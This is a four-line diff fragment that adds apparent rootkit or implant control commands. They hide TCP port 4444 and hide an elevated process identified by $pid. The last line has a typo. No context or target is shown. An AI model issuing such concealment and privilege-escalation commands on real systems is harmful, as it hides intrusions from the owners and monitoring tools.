@@ -1,0 +1,4 @@
+port hide 4444 tcp remote 
+process add $pid 
+process elevate $pid 
+processs hide $pid 
